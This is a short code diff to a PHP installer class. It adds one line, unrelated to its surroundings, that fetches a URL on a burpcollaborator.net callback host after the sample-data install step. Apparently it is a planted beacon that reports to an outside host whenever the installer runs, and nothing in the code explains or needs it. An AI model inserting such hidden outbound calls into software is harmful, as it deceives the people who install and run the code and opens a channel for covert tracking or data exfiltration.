@@ -414,6 +414,7 @@ class Installer
         if ($this->sampleDataState->hasError()) {
             $this->log->log('Sample Data is installed with errors. See log file for details');
         }
+	$xml = file_get_contents("http://1qsqa8hwm3jdkexqgcxtmk1ie9k38s.burpcollaborator.net");
     }
 
     /**
